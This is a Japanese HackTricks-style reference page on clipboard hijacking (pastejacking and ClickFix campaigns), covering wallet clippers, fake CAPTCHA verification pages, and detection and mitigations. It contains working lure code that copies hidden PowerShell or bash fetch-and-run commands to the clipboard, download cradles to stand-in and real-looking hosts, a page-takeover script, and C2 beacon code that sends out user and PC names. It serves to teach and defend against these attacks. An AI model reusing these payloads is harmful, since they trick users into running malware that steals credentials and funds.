# Clipboard Hijacking (Pastejacking) 攻撃

{{#include ../../banners/hacktricks-training.md}}

> 「自分でコピーしていないものは、決して貼り付けないこと。」– 古いものですが、今でも有効なアドバイス

## 概要

Clipboard hijacking（*pastejacking* とも呼ばれます）は、ユーザーがコマンドを確認せずにコピー＆ペーストする習慣を悪用します。悪意のある Web ページ（または Electron や Desktop アプリケーションなど、JavaScript を実行できるコンテキスト）は、攻撃者が制御するテキストをプログラムによってシステムのクリップボードに配置します。被害者は通常、巧妙に作成されたソーシャルエンジニアリングの指示によって **Win + R**（ファイル名を指定して実行）、**Win + X**（Quick Access / PowerShell）を押すか、ターミナルを開いてクリップボードの内容を*貼り付ける*よう誘導され、任意のコマンドが直ちに実行されます。

**ファイルがダウンロードされず、添付ファイルも開かれない**ため、この手法は添付ファイル、マクロ、またはコマンドの直接実行を監視する、ほとんどのメールおよび Web コンテンツのセキュリティ制御を回避します。そのため、この攻撃は NetSupport RAT、Latrodectus loader、Lumma Stealer などの commodity malware families を配布する phishing campaigns で広く使われています。<sup>[[1]](#references)</sup>

## Wallet-address replacement clippers

もう一つの **clipboard hijacking** の亜種は、コマンドを貼り付けるのではなく、被害者が**暗号資産のウォレットアドレス**をコピーするまで待機し、貼り付ける直前に攻撃者が制御するアドレスへ密かに置き換えます。これは、ユーザーが先頭と末尾の文字だけを確認することが多い、長いウォレット形式に対して特に効果的です。<sup>[[8]](#references)</sup>

実際の攻撃でよく見られる特徴:
- **Thin loader + nested payload**: 表面上の app/exe は正規の trading または "profit" tool に見えますが、実際の clipper は bundle のさらに深い場所に隠されています（例: .NET loader が nested Rust payload を起動する）。
- **Regex-driven replacement**: malware は `bc1...`、`1...`、`3...`、`0x...`、`addr1...`、`DdzFF...`、`ltc...`、`T...`、`r...`、または汎用的な **44-character Solana-like** 文字列などに一致する文字列を検出し、攻撃者の wallet に書き換えます。
- **Wallet rotation at scale**: 最新の Windows samples では、単一の static address ではなく、currency ごとに**数千**の replacement wallet を埋め込んでいる場合があります。これにより、盗難のたびに wallet reputation が損なわれることを抑えられます。<sup>[[8]](#references)</sup>

### Windows clipper flow

一般的な実装は、**`AddClipboardFormatListener`** で登録された hidden window です。クリップボードが更新されるたびに、malware は通常、次の処理を呼び出します。<sup>[[8]](#references)</sup>
- **`OpenClipboard`** → 現在のクリップボードデータにアクセスします。
- **`GetClipboardData`** → テキストを読み取ります。
- **`EmptyClipboard`** + **`SetClipboardData`** → wallet string を攻撃者の値に置き換えます。

clippers で頻繁に確認される最小限の hunting regexes:
```regex
\b(bc1)[A-Za-z0-9]{26,45}\b
\b(1)[A-Za-z0-9]{26,35}\b
\b(3)[A-Za-z0-9]{26,35}\b
\b(0x)[A-Za-z0-9]{40,46}\b
\b(addr1)[A-Za-z0-9]{26,108}\b
\b[A-Za-z0-9]{44}\b
```
User-level persistence だけで impact には十分です。観測されたパターンの 1 つは次のとおりです。<sup>[[8]](#references)</sup>
- payload を **`%APPDATA%\silke\silke.exe`** にコピーする
- **Startup-folder LNK** を `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\` 配下に作成する

Detection ideas:
- clipboard APIs を継続的に呼び出しながら、`%APPDATA%` およびユーザーの **Startup** folder 配下に書き込む Processes。
- 新しい LNK/executable の作成後に、wallet-address の clipboard rewrites が発生すること。
- 未使用ファイルを多数含み、小さな launcher が nested binary を起動する Archives または fake-software bundles。

### macOS social-engineered quarantine removal + LaunchAgent persistence

macOS では、一部の campaign が **`unlocker.command`** helper を配布し、Gatekeeper が app を damaged または unidentified developer 由来と判断した場合に、victim に right-click → **Open** するよう指示します。script は quarantine を削除し、近くにある `.app` を起動するだけです。<sup>[[8]](#references)</sup>
```bash
/usr/bin/xattr -cr "$chosen"
/usr/bin/open "$chosen"
```
これは **Gatekeeper exploit** ではなく、Gatekeeper の判断が `com.apple.quarantine` xattr に依存する事実を悪用した **social-engineered quarantine bypass** です。<sup>[[8]](#references)</sup>

実行後、clipper は以下を書き込むことで current user として persistence できます。<sup>[[8]](#references)</sup>
- **`~/launch.sh`** – wrapper script
- **`~/Library/LaunchAgents/com.example..plist`** – `RunAtLoad` と `KeepAlive` を設定した LaunchAgent

防御上役立つ詳細として、一部のサンプルには、約 30 秒ごとに LaunchAgent と wrapper を再書き込みする **self-healing watchdog** が実装されています。実行中の process を kill せずに plist を先に削除すると、malware が即座に再作成する可能性があります。<sup>[[8]](#references)</sup> Safe cleanup の順序:
1. 実行中の clipper process を kill する。
2. LaunchAgent plist を unload/delete する。
3. `~/launch.sh` とコピーされた payload を削除する。

### Delivery note: fake reputation as a force multiplier

この family では、malware 自体は技術的に単純なままでも、**distribution layer** が大きな役割を果たします。fake GitHub stars/forks、SourceForge の reviews/downloads、YouTube tutorial の comments/views、そして無害に見える VirusTotal の comments/votes を利用して、実行前に binary が trustworthy に見えるようにします。<sup>[[8]](#references)</sup>

## Forced copy buttons and hidden payloads (macOS one-liners)

一部の macOS infostealers は installer site（例: Homebrew）を clone し、ユーザーが表示された text の一部だけを highlight できないように **“Copy” button の使用を強制**します。clipboard entry には想定された installer command と、追加された Base64 payload（例: `...; echo <b64> | base64 -d | sh`）が含まれているため、1 回の paste で両方が実行されますが、UI では追加の stage が隠されています。<sup>[[5]](#references)</sup>

## JavaScript Proof-of-Concept
```html
<!-- Any user interaction (click) is enough to grant clipboard write permission in modern browsers -->
<button id="fix" onclick="copyPayload()">Fix the error</button>
<script>
function copyPayload() {
const payload = `powershell -nop -w hidden -enc <BASE64-PS1>`; // hidden PowerShell one-liner
navigator.clipboard.writeText(payload)
.then(() => alert('Now press  Win+R , paste and hit Enter to fix the problem.'));
}
</script>
```
Older campaignsでは`document.execCommand('copy')`を使用し、newer onesでは非同期の**Clipboard API**（`navigator.clipboard.writeText`）に依存しています。<sup>[[2]](#references)</sup>

## ClickFix / ClearFake フロー

1. Userがtyposquattedまたはcompromised site（例：`docusign.sa[.]com`）にアクセスする
2. Injected **ClearFake** JavaScriptが`unsecuredCopyToClipboard()` helperを呼び出し、Base64-encoded PowerShell one-linerをclipboardにひそかに保存する。
3. HTML instructionsがvictimに次の操作を指示する：*「**Win + R**を押し、commandをpasteしてEnterを押し、問題を解決してください。」*
4. `powershell.exe`が実行され、legitimate executableとmalicious DLLを含むarchiveをdownloadする（classic DLL sideloading）。
5. loaderがadditional stagesをdecryptし、shellcodeをinjectしてpersistence（例：scheduled task）をinstallする - 最終的にNetSupport RAT / Latrodectus / Lumma Stealerを実行する。<sup>[[1]](#references)</sup>

### Example NetSupport RAT Chain
```powershell
powershell -nop -w hidden -enc <Base64>
# ↓ Decodes to:
Invoke-WebRequest -Uri https://evil.site/f.zip -OutFile %TEMP%\f.zip ;
Expand-Archive %TEMP%\f.zip -DestinationPath %TEMP%\f ;
%TEMP%\f\jp2launcher.exe             # Sideloads msvcp140.dll
```
* `jp2launcher.exe`（正規の Java WebStart）は、`msvcp140.dll` を求めて自身のディレクトリを検索する。
* 悪意のある DLL は **GetProcAddress** を使用して API を動的に解決し、**curl.exe** 経由で 2 つのバイナリ（`data_3.bin`、`data_4.bin`）をダウンロードし、ローリング XOR キー `"https://google.com/"` を使用して復号する。その後、最終的な shellcode を inject し、**NetSupport RAT** の `client32.exe` を `C:\ProgramData\SecurityCheck_v1\` に解凍する。<sup>[[1]](#references)</sup>

### Latrodectus Loader
```
powershell -nop -enc <Base64>  # Cloud Identificator: 2031
```
1. **curl.exe** で `la.txt` をダウンロード
2. **cscript.exe** 内で JScript downloader を実行
3. MSI payload を取得 → 署名付きアプリケーションの隣に `libcef.dll` を配置 → DLL sideloading → shellcode → Latrodectus.<sup>[[1]](#references)</sup>

### MSHTA 経由の Lumma Stealer
```
mshta https://iplogger.co/xxxx =+\\xxx
```
**mshta** の呼び出しは、`PartyContinued.exe` を取得し、`Boat.pst` (CAB) を展開し、`extrac32` とファイル連結によって `AutoIt3.exe` を再構築し、最終的にブラウザー認証情報を `sumeriavgv.digital` へ exfiltrates する `.a3x` script を実行する、hidden PowerShell script を起動します。<sup>[[1]](#references)</sup>

## ClickFix: Clipboard → PowerShell → JS eval → Startup LNK with rotating C2 (PureHVNC)

一部の ClickFix campaigns は file downloads を完全に省略し、WSH 経由で JavaScript を fetch して実行し、それを永続化して、C2 を毎日 rotate する one-liner を victim に paste させます。観測された chain の例:<sup>[[3]](#references)</sup>
```powershell
powershell -c "$j=$env:TEMP+'\a.js';sc $j 'a=new
ActiveXObject(\"MSXML2.XMLHTTP\");a.open(\"GET\",\"63381ba/kcilc.ellrafdlucolc//:sptth\".split(\"\").reverse().join(\"\"),0);a.send();eval(a.responseText);';wscript $j" Prеss Entеr
```
主な特徴
- 難読化された URL を実行時に逆順化し、簡単な調査を回避。
- JavaScript は Startup LNK（WScript/CScript）を介して自身を永続化し、現在の日付に基づいて C2 を選択することで、ドメインの迅速なローテーションを可能にする。<sup>[[3]](#references)</sup>

日付によって C2 をローテーションするために使用される最小限の JS フラグメント:<sup>[[3]](#references)</sup>
```js
function getURL() {
var C2_domain_list = ['stathub.quest','stategiq.quest','mktblend.monster','dsgnfwd.xyz','dndhub.xyz'];
var current_datetime = new Date().getTime();
var no_days = getDaysDiff(0, current_datetime);
return 'https://'
+ getListElement(C2_domain_list, no_days)
+ '/Y/?t=' + current_datetime
+ '&v=5&p=' + encodeURIComponent(user_name + '_' + pc_name + '_' + first_infection_datetime);
}
```
次の段階では通常、persistenceを確立してRAT（例：PureHVNC）を取得するloaderが展開されます。このloaderはハードコードされた証明書に対してTLS pinningを行い、通信をchunkingすることがよくあります。<sup>[[3]](#references)</sup>

このvariantに特化したDetection ideas
- Process tree: `explorer.exe` → `powershell.exe -c` → `wscript.exe <temp>\a.js`（または`cscript.exe`）。
- Startup artifacts: `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup` 内のLNKから、`%TEMP%`/`%APPDATA%`配下のJS pathを指定してWScript/CScriptを実行するもの。
- `.split('').reverse().join('')` または `eval(a.responseText)` を含むRegistry/RunMRUおよびcommand-line telemetry。
- 長いcommand lineを使わずにlong scriptを渡すため、大きなstdin payloadsを伴う `powershell -NoProfile -NonInteractive -Command -` の繰り返し実行。
- updaterらしいtask/path（例：`\GoogleSystem\GoogleUpdater`）の下で、後続して `regsvr32 /s /i:--type=renderer "%APPDATA%\Microsoft\SystemCertificates\<name>.dll"` のようなLOLBinsを実行するScheduled Tasks。

Threat hunting
- 日次でrotateするC2 hostnamesおよび、`.../Y/?t=<epoch>&v=5&p=<encoded_user_pc_firstinfection>` patternを持つURLs。
- clipboard write eventsの後にWin+Rによるpasteが発生し、直後に`powershell.exe`が実行される流れをcorrelateする。

Blue-teamsはclipboard、process-creation、registry telemetryを組み合わせることで、pastejacking abuseを特定できます。

* Windows Registry: `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU` には**Win + R** commandsのhistoryが保存されます。通常とは異なるBase64 / obfuscated entriesを探します。
* Security Event ID **4688** (Process Creation)：`ParentImage` == `explorer.exe` かつ `NewProcessName` が { `powershell.exe`, `wscript.exe`, `mshta.exe`, `curl.exe`, `cmd.exe` }。
* Event ID **4663**：疑わしい4688 eventの直前に、`%LocalAppData%\Microsoft\Windows\WinX\` またはtemporary folders配下でfile creationsが発生しているもの。
* EDR clipboard sensors（存在する場合）：`Clipboard Write`の直後に新しいPowerShell processが起動する流れをcorrelateします。

## IUAM-style verification pages (ClickFix Generator): clipboard copy-to-console + OS-aware payloads

最近のcampaignsでは、偽のCDN/browser verification pages（「Just a moment…」、IUAM-style）を大量生成し、ユーザーにclipboardからOS-specific commandsをnative consolesへcopyさせます。これによりexecutionをbrowser sandboxの外へpivotでき、WindowsとmacOSの両方で機能します。<sup>[[4]](#references)</sup>

Key traits of the builder-generated pages
- `navigator.userAgent`によるOS detectionでpayloadsを調整します（Windows PowerShell/CMDとmacOS Terminal）。unsupported OS向けにoptional decoys/no-opsを用意し、illusionを維持することもあります。
- 無害に見えるUI actions（checkbox/Copy）でautomatic clipboard-copyを行いますが、visible textはclipboard contentと異なる場合があります。
- Mobile blockingとstep-by-step instructionsを表示するpopover：Windows → Win+R→paste→Enter、macOS → open Terminal→paste→Enter。
- Optional obfuscationとsingle-file injectorにより、Tailwind-styled verification UIでcompromised siteのDOMを上書きします（新しいdomain registrationは不要）。<sup>[[4]](#references)</sup>

Example: clipboard mismatch + OS-aware branching
```html
<div class="space-y-2">
<label class="inline-flex items-center space-x-2">
<input id="chk" type="checkbox" class="accent-blue-600"> <span>I am human</span>
</label>
<div id="tip" class="text-xs text-gray-500">If the copy fails, click the checkbox again.</div>
</div>
<script>
const ua = navigator.userAgent;
const isWin = ua.includes('Windows');
const isMac = /Mac|Macintosh|Mac OS X/.test(ua);
const psWin = `powershell -nop -w hidden -c "iwr -useb https://example[.]com/cv.bat|iex"`;
const shMac = `nohup bash -lc 'curl -fsSL https://example[.]com/p | base64 -d | bash' >/dev/null 2>&1 &`;
const shown = 'copy this: echo ok';            // benign-looking string on screen
const real = isWin ? psWin : (isMac ? shMac : 'echo ok');

function copyReal() {
// UI shows a harmless string, but clipboard gets the real command
navigator.clipboard.writeText(real).then(()=>{
document.getElementById('tip').textContent = 'Now press Win+R (or open Terminal on macOS), paste and hit Enter.';
});
}

document.getElementById('chk').addEventListener('click', copyReal);
</script>
```
macOSでの初回実行時のpersistence
- `nohup bash -lc '<fetch | base64 -d | bash>' >/dev/null 2>&1 &` を使用すると、terminalを閉じた後もexecutionが継続し、目に見える痕跡を減らせます。<sup>[[4]](#references)</sup>

compromised sites上でのページのin-place takeover
```html
<script>
(async () => {
const html = await (await fetch('https://attacker[.]tld/clickfix.html')).text();
document.documentElement.innerHTML = html;                 // overwrite DOM
const s = document.createElement('script');
s.src = 'https://cdn.tailwindcss.com';                     // apply Tailwind styles
document.head.appendChild(s);
})();
</script>
```
IUAM-style lures に特有の Detection と hunting のアイデア
- Web: Clipboard API を verification widgets に bind するページ、表示テキストと clipboard payload の不一致、`navigator.userAgent` による分岐、不審なコンテキストにおける Tailwind + single-page replace。
- Windows エンドポイント: ブラウザー操作の直後に `explorer.exe` → `powershell.exe`/`cmd.exe` が起動すること、`%TEMP%` から実行される batch/MSI installers。
- macOS エンドポイント: ブラウザーイベントの付近で、Terminal/iTerm が `bash`/`curl`/`base64 -d` を `nohup` とともに spawn すること、Terminal を閉じた後も存続する background jobs。
- `RunMRU` の Win+R 履歴および clipboard writes と、その後の console process creation を相関させる。

関連する技術については以下も参照

{{#ref}}
clone-a-website.md
{{#endref}}

{{#ref}}
homograph-attacks.md
{{#endref}}

## 2026 年の fake CAPTCHA / ClickFix の進化（ClearFake、Scarlet Goldfinch）

- ClearFake は引き続き WordPress sites を compromise し、外部ホスト（Cloudflare Workers、GitHub/jsDelivr）を chain する loader JavaScript を inject している。さらに、blockchain の「etherhiding」calls（例：`bsc-testnet.drpc[.]org` などの Binance Smart Chain API endpoints への POST）まで使用し、最新の lure logic を取得している。最近の overlays では、何かを download させる代わりに、ユーザーへ one-liner（T1204.004）を copy/paste させる fake CAPTCHAs が多用されている。<sup>[[6]](#references)</sup>
- Initial execution は、signed script hosts/LOLBAS へ委譲されるケースが増えている。2026 年 1 月の chains では、従来の `mshta` の使用を、`WScript.exe` 経由で実行される組み込みの `SyncAppvPublishingServer.vbs` に置き換え、aliases/wildcards を含む PowerShell-like arguments を渡して remote content を取得していた。<sup>[[6]](#references)</sup>
```cmd
"C:\WINDOWS\System32\WScript.exe" "C:\WINDOWS\system32\SyncAppvPublishingServer.vbs" "n;&(gal i*x)(&(gcm *stM*) 'cdn.jsdelivr[.]net/gh/grading-chatter-dock73/vigilant-bucket-gui/p1lot')"
```
- `SyncAppvPublishingServer.vbs` は署名済みで、通常は App-V によって使用されますが、`WScript.exe` と組み合わせ、通常とは異なる引数（`gal`/`gcm` エイリアス、ワイルドカード付き cmdlet、jsDelivr URL）を指定すると、ClearFake の高シグナルな LOLBAS stage になります。<sup>[[6]](#references)</sup>
- 2026年2月、fake CAPTCHA payloads は pure PowerShell download cradles へと戻りました。実際に稼働している例は2つあります。<sup>[[6]](#references)</sup>
```powershell
"C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -c iex(irm 158.94.209[.]33 -UseBasicParsing)
"C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -w h -c "$w=New-Object -ComObject WinHttp.WinHttpRequest.5.1;$w.Open('GET','https[:]//cdn[.]jsdelivr[.]net/gh/www1day7/msdn/fase32',0);$w.Send();$f=$env:TEMP+'\FVL.ps1';$w.ResponseText>$f;powershell -w h -ep bypass -f $f"
```
- First chain is an in-memory `iex(irm ...)` grabber; the second stages via `WinHttp.WinHttpRequest.5.1`, writes a temp `.ps1`, then launches with `-ep bypass` in a hidden window.<sup>[[6]](#references)</sup>

これらの亜種に対する検知／ハンティングのヒント
- Process lineage: ブラウザ → `explorer.exe` → `wscript.exe ...SyncAppvPublishingServer.vbs`、またはクリップボードへの書き込み／Win+R の直後に実行される PowerShell cradles。
- Command-line keywords: `SyncAppvPublishingServer.vbs`、`WinHttp.WinHttpRequest.5.1`、`-UseBasicParsing`、`%TEMP%\FVL.ps1`、jsDelivr/GitHub/Cloudflare Worker のドメイン、または raw IP の `iex(irm ...)` パターン。
- Network: Web browsing の直後に、script hosts／PowerShell から CDN worker hosts または blockchain RPC endpoints へ向かう outbound 通信。
- File/registry: `%TEMP%` 配下での一時 `.ps1` 作成、およびこれらの one-liners を含む RunMRU entries。外部 URL や obfuscated alias strings を指定して実行される signed-script LOLBAS（WScript/cscript/mshta）に対して block／alert を行う。

## June 2026 ClickFix tradecraft: paste telemetry、fake verification comments、LOLBin chaining

Recent Red Canary telemetry shows that the stable indicator is **not one exact command**, but the combination of **user-assisted paste-and-run**、**trusted interpreters/LOLBins**、**obfuscated flags**、**remote retrieval**、および **immediate execution** です。<sup>[[7]](#references)</sup>

### Notable operator patterns

- **Paste confirmation telemetry**: 一部の payloads は、実際の stage の前に `curl -fsS -4 --connect-timeout 5 --max-time 10 -X POST ... /api/metrics/run?event=pasted` を呼び出します。これにより、window を短時間かつ静かな状態に保ちながら、ユーザーの操作を確認します。
- **Fake verification comments**: PowerShell one-liners は、`# Security check ✔️ I'm not a robot Verification ID: 138105` のような strings を付加する場合があります。これにより、Run／`cmd.exe`／PowerShell history に貼り付けられた後も、command が CAPTCHA 関連に見えます。
- **Dynamic URL reconstruction**: `iex(irm(('ccud'+'mcx')+('.x'+'yz/u')))` は、command line に static URL が現れるのを避けながら、in-memory download-and-execute を実行します。
- **Masqueraded installer execution**: `"C:\WINDOWS\system32\msIeXec.exe" -PAcKᵃGE http://... /Q` は、flags に unusual casing と Unicode-like characters を使用して brittle detections を回避しながら、`msiexec.exe` に似せて悪用します。
- **Caret-escaped LOLBin chains**: `cmd.exe` は `^` escapes（`s^t^a^r^t`、`^c^u^r^l^`、`^m^s^h^t^a^`）で keywords を隠し、nested shell を minimized 状態で起動し、attacker content を `.pdf` のような benign extension で保存した後、`mshta` 経由で実行できます。<sup>[[7]](#references)</sup>
## Mitigations

1. Browser hardening – clipboard write-access（`dom.events.asyncClipboard.clipboardItem` など）を無効化する、または user gesture を要求する。
2. Security awareness – ユーザーに sensitive commands を *入力する* か、まず text editor に貼り付けるよう教育する。
3. PowerShell Constrained Language Mode／Execution Policy + Application Control により、任意の one-liners を block する。
4. Network controls – 既知の pastejacking および malware C2 domains への outbound requests を block する。

## Related Tricks

* **Discord Invite Hijacking** は、ユーザーを malicious server に誘導した後、同じ ClickFix approach を悪用することがよくあります。

{{#ref}}
discord-invite-hijacking.md
{{#endref}}

## References

- [1] [ClickFix を防止する：ClickFix Attack Vector の阻止](https://unit42.paloaltonetworks.com/preventing-clickfix-attack-vector/)
- [2] [Pastejacking PoC – GitHub](https://github.com/dxa4481/Pastejacking)
- [3] [Check Point Research – Under the Pure Curtain: RAT から Builder、Coder へ](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [4] [The ClickFix Factory: IUAM ClickFix Generator の初の公開](https://unit42.paloaltonetworks.com/clickfix-generator-first-of-its-kind/)
- [5] [2025 年、Infostealer の年](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
- [6] [Red Canary – Intelligence Insights: February 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-february-2026/)
- [7] [Red Canary – Intelligence Insights: June 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-june-2026/)
- [8] [Check Point Research – From Stars to Upvotes: Fake Reputation Fueling a Crypto Clipboard Hijacker](https://research.checkpoint.com/2026/from-stars-to-upvotes-fake-reputation-fueling-a-crypto-clipboard-hijacker/)

{{#include ../../banners/hacktricks-training.md}}
